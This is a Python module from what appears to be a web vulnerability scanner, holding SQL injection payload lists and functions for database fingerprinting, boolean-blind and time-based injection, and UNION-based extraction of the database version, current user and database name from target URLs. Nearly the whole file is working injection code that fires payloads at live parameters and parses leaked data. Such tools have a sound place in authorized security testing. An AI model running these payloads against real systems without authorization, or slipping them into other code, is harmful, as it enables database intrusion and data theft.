# sqli_part.py — SQL Injection phases & helpers

import re
import time
import difflib
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from copy import deepcopy

# --- Default SQL payloads ---
SQL_PAYLOADS = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", " OR 1=1--"]

SQL_ERR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark after the character string",
    r"syntax error.*mysql",
    r"pg_query\(",
]
SQL_ERR_RE = re.compile("|".join(SQL_ERR_PATTERNS), re.IGNORECASE)

# --- DB-specific error signatures for DBMS fingerprinting ---
DB_ERROR_SIGNATURES = {
    "mysql": [
        r"you have an error in your sql syntax",
        r"mysql server version for the right syntax",
        r"warning: mysql_?",
        r"mysqli?_",
        r"pdo_mysql"
    ],
    "mariadb": [
        r"mariadb server version for the right syntax",
        r"mariadb"
    ],
    "mssql": [
        r"unclosed quotation mark after the character string",
        r"microsoft sql server",
        r"sql server native client",
        r"odbc sql server driver",
        r"\[sql server\]",
        r"microsoft ole db provider for sql server"
    ],
    "postgresql": [
        r"pg::syntaxerror",
        r"psql:\s*error",
        r"org\.postgresql",
        r"postgresql.*error",
        r"error:\s+syntax error at or near"
    ],
    "oracle": [
        r"ora-\d{5}",
        r"oracle error",
        r"oracle database",
        r"quoted string not properly terminated"
    ]
}

# --- Active DB fingerprint payloads ---
ACTIVE_FP_PAYLOADS = [
    "'\")))))",
    "' AND 1=CONVERT(INT,@@version)--",
    "'; SELECT pg_sleep(0); --",
    "'||(SELECT 1/0)||'"
]

# --- Time-based SQLi payloads ---
TIME_SSQLI_PAYLOADS = {
    "mysql": [
        "' OR SLEEP({delay})-- -",
        "\" OR SLEEP({delay})-- -",
        "1) OR SLEEP({delay})-- -",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:{delay}'--",
        "\"; WAITFOR DELAY '0:0:{delay}'--",
    ],
    "postgresql": [
        "'; SELECT pg_sleep({delay});--",
        "\"; SELECT pg_sleep({delay});--",
    ],
    "generic": [
        "' AND IF(1=1,SLEEP({delay}),0)-- -"
    ]
}

# --- UNION expressions ---
DB_UNION_EXPRS = {
    "mysql": {
        "version": "CONCAT('SCNVER:',@@version,':ENDSCN')",
        "user":    "CONCAT('SCNUSER:',USER(),':ENDSCN')",
        "db":      "CONCAT('SCNDB:',DATABASE(),':ENDSCN')",
    },
    "postgresql": {
        "version": "('SCNVER:' || version() || ':ENDSCN')",
        "user":    "('SCNUSER:' || current_user || ':ENDSCN')",
        "db":      "('SCNDB:' || current_database() || ':ENDSCN')",
    },
    "mssql": {
        "version": "('SCNVER:' + CAST(@@version AS NVARCHAR(4000)) + ':ENDSCN')",
        "user":    "('SCNUSER:' + SYSTEM_USER + ':ENDSCN')",
        "db":      "('SCNDB:' + DB_NAME() + ':ENDSCN')",
    },
}

def is_sql_error(text: str) -> bool:
    return bool(text and SQL_ERR_RE.search(text))

def _looks_numeric_simple(v):
    try:
        float(v)
        return True
    except Exception:
        return False

def _pick_db_key_from_fingerprint(fp):
    db = (fp or {}).get("database") or ""
    db = (db or "").lower()
    if "mysql" in db or "maria" in db:
        return "mysql"
    if "postgres" in db:
        return "postgresql"
    if "mssql" in db or "sql server" in db:
        return "mssql"
    return "generic"

# -------------------------
# Active DB Fingerprinting
# -------------------------
def active_db_fingerprint(method, url, params, request_with_timeout, headers=None, verbose=False, log=print):
    evidence = []
    scores = {}

    if not params:
        return None, evidence

    parsed = urlparse(url)

    for pname, values in params.items():
        original = values[0] if values else ""
        for pl in ACTIVE_FP_PAYLOADS:
            new_params = deepcopy(params)
            new_params[pname] = [str(original) + pl]
            q = urlencode({k: v[0] for k, v in new_params.items()}, doseq=False)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q, parsed.fragment))

            r = request_with_timeout(method, test_url, headers=headers)
            if not r:
                continue

            body = (r.text or "").lower()
            for dbms, patterns in DB_ERROR_SIGNATURES.items():
                for p in patterns:
                    try:
                        if re.search(p, body):
                            scores[dbms] = scores.get(dbms, 0) + 1
                            evidence.append(
                                f"active-fp: param={pname}, payload={pl!r}, url={test_url}, matched /{p}/ for {dbms}"
                            )
                    except re.error:
                        continue

    if not scores:
        return None, evidence

    best_db = max(scores, key=scores.get)
    evidence.append(f"active-fp result: best_db={best_db} with score={scores[best_db]}")
    if verbose:
        log(f"[ACTIVE-FP] Active fingerprint scores: {scores}, chosen={best_db}")

    return best_db, evidence


# -------------------------
# Phase 1: Boolean Blind SQLi
# -------------------------
class BlindBooleanSQLiPhase:
    def __init__(self, request_with_timeout, normalize_response, now_ts, compute_score, log=print,
                 retries=3, length_diff_ratio=0.15, similarity_threshold=0.97):
        self.request_with_timeout = request_with_timeout
        self.normalize_response = normalize_response
        self.now_ts = now_ts
        self.compute_score = compute_score
        self.log = log

        self.retries = max(1, retries)
        self.length_diff_ratio = length_diff_ratio
        self.similarity_threshold = similarity_threshold

    def _send_retriable(self, method, url, headers=None):
        lengths = []
        bodies = []
        statuses = []
        for _ in range(self.retries):
            r = self.request_with_timeout(method, url, headers=headers)
            if not r:
                continue
            body = self.normalize_response(r.text or "")
            lengths.append(len(body))
            bodies.append(body)
            statuses.append(r.status_code)
        if not lengths:
            return None, None, None
        avg_len = sum(lengths) / len(lengths)
        return avg_len, bodies[-1], statuses[-1]

    def _looks_numeric(self, value):
        try:
            float(value)
            return True
        except Exception:
            return False

    def _build_injected_value(self, original_value, which):
        original_value = "" if original_value is None else original_value
        if self._looks_numeric(original_value):
            return f"{original_value} AND 1=1" if which == "true" else f"{original_value} AND 1=2"
        return f"{original_value}' AND '1'='1" if which == "true" else f"{original_value}' AND '1'='2"

    def _similar(self, a, b):
        if a is None or b is None:
            return 0.0
        return difflib.SequenceMatcher(None, a, b).ratio()

    def _significant_length_diff(self, len_a, len_b):
        if len_a is None or len_b is None:
            return False
        bigger = max(len_a, len_b)
        smaller = min(len_a, len_b)
        if bigger == 0:
            return False
        diff_ratio = (bigger - smaller) / bigger
        return diff_ratio >= self.length_diff_ratio

    def run_for_url(self, method, url, headers=None, fingerprint=None):
        method = method.upper()
        if method != "GET":
            return []

        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return []

        base_len, base_body, base_status = self._send_retriable(method, url, headers=headers)
        if base_body is None:
            return []

        findings = []
        for param_name, values in params.items():
            original_value = values[0] if values else ""

            true_params = deepcopy(params)
            true_params[param_name] = [self._build_injected_value(original_value, "true")]
            true_qs = urlencode({k: v[0] for k, v in true_params.items()}, doseq=False)
            true_url = urlunparse(parsed._replace(query=true_qs))

            false_params = deepcopy(params)
            false_params[param_name] = [self._build_injected_value(original_value, "false")]
            false_qs = urlencode({k: v[0] for k, v in false_params.items()}, doseq=False)
            false_url = urlunparse(parsed._replace(query=false_qs))

            true_len, true_body, true_status = self._send_retriable(method, true_url, headers=headers)
            false_len, false_body, false_status = self._send_retriable(method, false_url, headers=headers)

            if true_body is None or false_body is None:
                continue

            sim_base_true = self._similar(base_body, true_body)
            sim_base_false = self._similar(base_body, false_body)
            sim_true_false = self._similar(true_body, false_body)

            is_true_like_base = (sim_base_true >= self.similarity_threshold and
                                 not self._significant_length_diff(base_len, true_len))

            is_false_differs = (
                sim_base_false < self.similarity_threshold or
                self._significant_length_diff(base_len, false_len) or
                sim_true_false < self.similarity_threshold or
                self._significant_length_diff(true_len, false_len)
            )

            if is_true_like_base and is_false_differs:
                score = 40
                finding = {
                    "timestamp": self.now_ts(),
                    "url": url,
                    "test_url": false_url,
                    "method": method,
                    "injected_param": param_name,
                    "payload": "[BOOLEAN_PROBE: AND 1=1 / AND 1=2]",
                    "vuln_type": "Potential Blind SQLi",
                    "reason": (
                        "Boolean-based difference: baseline≈true (AND 1=1) but baseline/false (AND 1=2) responses differ. "
                        f"sim_base_true={sim_base_true:.3f}, sim_base_false={sim_base_false:.3f}, sim_true_false={sim_true_false:.3f}"
                    ),
                    "status_code": false_status,
                    "auto_verified": False,
                    "verify": {
                        "verified": False,
                        "evidence": "Phase 1 boolean heuristic only",
                        "score_delta": 0,
                        "elapsed": 0.0
                    },
                    "fingerprint": fingerprint or {},
                    "score": score,
                    "status": "probable",
                    "base_len": int(base_len or 0),
                    "resp_len": int(false_len or 0)
                }
                self.log(f"[BLIND] Potential Blind SQLi on {url} param '{param_name}' (score={score})")
                findings.append(finding)

        return findings


# -------------------------
# Phase 2: Time-based SQLi
# -------------------------
def measure_avg_response_time(method, url, request_with_timeout, headers=None, data=None, json_body=None, samples=3):
    times = []
    last_status = None
    last_len = 0
    for _ in range(max(1, samples)):
        t0 = time.time()
        r = request_with_timeout(method, url, headers=headers, data=data, json_body=json_body)
        if not r:
            continue
        dt = time.time() - t0
        times.append(dt)
        last_status = r.status_code
        last_len = len(r.text or "")
    if not times:
        return None, None, None
    avg = sum(times) / len(times)
    return avg, last_status, last_len

def run_time_based_sqli_phase(method, url, params, headers, json_body, post_data,
                              fingerprint, time_delay, time_threshold, time_samples,
                              request_with_timeout, compute_score, log, now_ts, verbose=False):
    findings = []
    method = method.upper()
    if not params:
        return findings

    db_key = _pick_db_key_from_fingerprint(fingerprint)
    payload_templates = TIME_SSQLI_PAYLOADS.get(db_key, TIME_SSQLI_PAYLOADS["generic"])

    baseline_avg, base_status, base_len = measure_avg_response_time(
        method, url, request_with_timeout,
        headers=headers,
        data=post_data if method == "POST" else None,
        json_body=json_body if method == "POST" and json_body is not None else None,
        samples=time_samples
    )
    if baseline_avg is None:
        return findings

    if verbose:
        log(f"[TIME] Baseline avg for {url}: {baseline_avg:.3f}s (samples={time_samples})")

    parsed = urlparse(url)

    for param_name, values in params.items():
        original_value = values[0] if values else ""
        for tmpl in payload_templates:
            injected_value = f"{original_value}{tmpl.format(delay=time_delay)}"
            new_params = deepcopy(params)
            new_params[param_name] = [injected_value]
            query = urlencode({k: v[0] for k, v in new_params.items()}, doseq=False)
            inj_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))

            inj_avg, inj_status, inj_len = measure_avg_response_time(
                method, inj_url, request_with_timeout,
                headers=headers,
                data=post_data if method == "POST" else None,
                json_body=json_body if method == "POST" and json_body is not None else None,
                samples=time_samples
            )
            if inj_avg is None:
                continue

            if verbose:
                log(f"[TIME] Param '{param_name}' payload '{tmpl.format(delay=time_delay)}': avg={inj_avg:.3f}s")

            if inj_avg >= baseline_avg + time_threshold:
                verify_result = {
                    "verified": True,
                    "evidence": f"time-based delay: baseline≈{baseline_avg:.2f}s, injected≈{inj_avg:.2f}s",
                    "score_delta": 50,
                    "elapsed": inj_avg
                }
                payload_str = tmpl.format(delay=time_delay)
                score = compute_score(base_confidence=40, fingerprint=fingerprint, verify_result=verify_result, payload=payload_str)
                status_label = "confirmed" if score >= 50 else "probable"

                finding = {
                    "timestamp": now_ts(),
                    "url": url,
                    "test_url": inj_url,
                    "method": method,
                    "injected_param": param_name,
                    "payload": payload_str,
                    "vuln_type": "Time-based SQLi",
                    "reason": f"response time increased from {baseline_avg:.2f}s to {inj_avg:.2f}s (threshold {time_threshold:.2f}s)",
                    "status_code": inj_status,
                    "auto_verified": True,
                    "verify": verify_result,
                    "fingerprint": fingerprint or {},
                    "score": score,
                    "status": status_label,
                    "base_len": int(base_len or 0),
                    "resp_len": int(inj_len or 0)
                }
                log(f"[VULN] Time-based SQLi on {url} param '{param_name}' payload: {payload_str} (score={score})")
                findings.append(finding)
                break

    return findings


# -------------------------
# UNION Extraction (Phase 3b)
# -------------------------
def _build_order_by_value(original_value, n):
    original_value = original_value or ""
    if _looks_numeric_simple(original_value):
        return f"{original_value} ORDER BY {n}-- "
    return f"{original_value}' ORDER BY {n}-- -"

def _build_union_value(original_value, select_list):
    original_value = original_value or ""
    if _looks_numeric_simple(original_value):
        return f"{original_value} UNION ALL SELECT {select_list}-- "
    return f"{original_value}' UNION ALL SELECT {select_list}-- -"

def _make_param_url(base_url, params, param_name, injected_value):
    parsed = urlparse(base_url)
    new_params = deepcopy(params) if params else {}
    new_params[param_name] = [injected_value]
    query = urlencode({k: v[0] for k, v in new_params.items()}, doseq=False)
    new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))
    return new_url

def _detect_column_count_order_by(method, url, params, param_name, headers, base_status, base_text_raw,
                                  request_with_timeout, normalize_response, length_change_ratio,
                                  max_cols=8, verbose=False, log=print):
    base_norm = normalize_response(base_text_raw or "")
    for n in range(1, max_cols + 1):
        inj_val = _build_order_by_value(params.get(param_name, ["1"])[0], n)
        test_url = _make_param_url(url, params, param_name, inj_val)
        r = request_with_timeout("GET", test_url, headers=headers)
        if not r:
            if verbose:
                log(f"[UNION] ORDER BY {n} failed for {test_url}")
            break
        text = r.text or ""
        norm = normalize_response(text)
        len_ratio = length_change_ratio(base_norm, norm)
        if r.status_code != base_status or len_ratio > 0.40 or is_sql_error(text):
            if n == 1:
                return None
            if verbose:
                log(f"[UNION] Column count for {url} param {param_name} ≈ {n-1}")
            return n - 1
    return None

def _test_union_compatible(url, params, param_name, headers, base_status, base_text_raw,
                           col_count, request_with_timeout, normalize_response, length_change_ratio,
                           verbose=False, log=print):
    nulls = ",".join(["NULL"] * col_count)
    original_value = params.get(param_name, ["1"])[0]
    inj_val = _build_union_value(original_value, nulls)
    test_url = _make_param_url(url, params, param_name, inj_val)
    r = request_with_timeout("GET", test_url, headers=headers)
    if not r:
        return False
    text = r.text or ""
    norm = normalize_response(text)
    base_norm = normalize_response(base_text_raw or "")
    len_ratio = length_change_ratio(base_norm, norm)
    if verbose:
        log(f"[UNION] UNION NULLs test: status={r.status_code}, len_ratio={len_ratio:.2f}")
    if r.status_code >= 500 or is_sql_error(text):
        return False
    return True

def _find_reflected_columns_union(url, params, param_name, headers, col_count,
                                 request_with_timeout, verbose=False, log=print):
    markers = [f"UNIONCOL_{i}_SCN" for i in range(1, col_count + 1)]
    select_list = ",".join([f"'{m}'" for m in markers])
    original_value = params.get(param_name, ["1"])[0]
    inj_val = _build_union_value(original_value, select_list)
    test_url = _make_param_url(url, params, param_name, inj_val)

    r = request_with_timeout("GET", test_url, headers=headers)
    if not r:
        return []
    body = r.text or ""
    reflected = []
    for i, m in enumerate(markers, start=1):
        if m in body:
            reflected.append(i)
    if verbose:
        log(f"[UNION] Reflected columns: {reflected}")
    return reflected

def _build_union_select_expr(expr, col_count, reflected_idx):
    cols = []
    for i in range(1, col_count + 1):
        cols.append(expr if i == reflected_idx else "NULL")
    return ",".join(cols)

def _extract_marker_from_body(body, marker_prefix):
    if not body:
        return None
    pattern = re.escape(marker_prefix) + r"(.*?)" + re.escape(":ENDSCN")
    m = re.search(pattern, body, re.DOTALL | re.IGNORECASE)
    if not m:
        return None
    return m.group(1).strip()

def run_union_extraction_phase(method, url, params, headers, fingerprint,
                               base_status, base_text_raw,
                               request_with_timeout, normalize_response, length_change_ratio,
                               compute_score, log, now_ts, verbose=False):
    findings = []
    method = method.upper()

    if method != "GET" or not params:
        return findings

    db_key = _pick_db_key_from_fingerprint(fingerprint)
    union_exprs = DB_UNION_EXPRS.get(db_key) or DB_UNION_EXPRS.get("mysql")
    if db_key not in DB_UNION_EXPRS:
        db_key = "mysql"

    for param_name, values in params.items():
        if verbose:
            log(f"[UNION] Trying UNION phase on {url} param {param_name}")

        col_count = _detect_column_count_order_by(
            method, url, params, param_name, headers, base_status, base_text_raw,
            request_with_timeout, normalize_response, length_change_ratio,
            max_cols=8, verbose=verbose, log=log
        )
        if not col_count or col_count < 1:
            continue

        if not _test_union_compatible(
            url, params, param_name, headers, base_status, base_text_raw, col_count,
            request_with_timeout, normalize_response, length_change_ratio,
            verbose=verbose, log=log
        ):
            continue

        reflected_cols = _find_reflected_columns_union(
            url, params, param_name, headers, col_count,
            request_with_timeout, verbose=verbose, log=log
        )
        if not reflected_cols:
            continue

        reflected_idx = reflected_cols[0]
        original_value = values[0] if values else ""

        db_info = {"db_type": db_key, "db_version": None, "current_user": None, "current_database": None}

        last_status = base_status
        last_test_url = url

        for tag, marker_prefix in [("version", "SCNVER:"), ("user", "SCNUSER:"), ("db", "SCNDB:")]:
            expr = union_exprs.get(tag)
            if not expr:
                continue
            select_list = _build_union_select_expr(expr, col_count, reflected_idx)
            inj_val = _build_union_value(original_value, select_list)
            test_url = _make_param_url(url, params, param_name, inj_val)

            r = request_with_timeout("GET", test_url, headers=headers)
            if not r:
                continue

            body = r.text or ""
            last_status = r.status_code
            last_test_url = test_url

            val = _extract_marker_from_body(body, marker_prefix)
            if verbose:
                log(f"[UNION] Extract {tag}: {val}")

            if tag == "version":
                db_info["db_version"] = val
            elif tag == "user":
                db_info["current_user"] = val
            else:
                db_info["current_database"] = val

        if not (db_info["db_version"] or db_info["current_user"] or db_info["current_database"]):
            continue

        verify_result = {"verified": True, "evidence": "UNION-based extraction with SCN* markers succeeded",
                         "score_delta": 60, "elapsed": 0.0}

        score = compute_score(base_confidence=50, fingerprint=fingerprint, verify_result=verify_result, payload="[UNION_EXTRACT]")

        finding = {
            "timestamp": now_ts(),
            "url": url,
            "test_url": last_test_url,
            "method": method,
            "injected_param": param_name,
            "payload": "[UNION_EXTRACT]",
            "vuln_type": "SQLi-UNION",
            "reason": (
                f"UNION-based SQLi confirmed; cols={col_count}, reflected={reflected_cols}, "
                f"version={db_info['db_version']}, user={db_info['current_user']}, db={db_info['current_database']}"
            ),
            "status_code": last_status,
            "auto_verified": True,
            "verify": verify_result,
            "fingerprint": fingerprint or {},
            "score": score,
            "status": "confirmed",
            "base_len": 0,
            "resp_len": 0,
            "db_info": db_info,
            "union_meta": {"column_count": col_count, "reflected_columns": reflected_cols}
        }
        log(f"[VULN] SQLi-UNION on {url} param '{param_name}' (score={score})")
        findings.append(finding)

    return findings


# -------------------------
# Auto-verify SQLi
# -------------------------
def auto_verify_sqli(method, url, param_name, original_params, post_data, headers,
                     request_with_timeout, normalize_response, base_text="",
                     json_body=None, json_key=None):
    true_p = "1' OR '1'='1"
    false_p = "1' AND '1'='2"

    if json_body is not None and json_key is not None:
        jb_true = deepcopy(json_body); jb_true[json_key] = true_p
        jb_false = deepcopy(json_body); jb_false[json_key] = false_p
        r_true = request_with_timeout(method, url, headers=headers, json_body=jb_true)
        r_false = request_with_timeout(method, url, headers=headers, json_body=jb_false)
    else:
        parsed = urlparse(url)
        p_true = deepcopy(original_params) if original_params else {}
        p_false = deepcopy(original_params) if original_params else {}
        key = param_name if param_name is not None else "_scantest"
        p_true[key] = [true_p]
        p_false[key] = [false_p]

        q_true = urlencode({k: v[0] for k, v in p_true.items()}, doseq=False)
        q_false = urlencode({k: v[0] for k, v in p_false.items()}, doseq=False)

        url_true = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q_true, parsed.fragment))
        url_false = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q_false, parsed.fragment))

        if method.upper() == "POST" and post_data and key in post_data:
            pd_t = deepcopy(post_data); pd_t[key] = true_p
            pd_f = deepcopy(post_data); pd_f[key] = false_p
            r_true = request_with_timeout("POST", url, data=pd_t, headers=headers)
            r_false = request_with_timeout("POST", url, data=pd_f, headers=headers)
        else:
            r_true = request_with_timeout("GET" if method.upper() == "GET" else "POST", url_true, data=post_data, headers=headers)
            r_false = request_with_timeout("GET" if method.upper() == "GET" else "POST", url_false, data=post_data, headers=headers)

    if not r_true or not r_false:
        return False

    bt = normalize_response(base_text or "")
    t_true = normalize_response(r_true.text or "")
    t_false = normalize_response(r_false.text or "")

    len_diff = abs(len(t_true) - len(t_false))
    if len_diff > max(30, int(len(bt) * 0.03)) or (t_true != t_false) or (r_true.status_code != r_false.status_code):
        return True
    return False
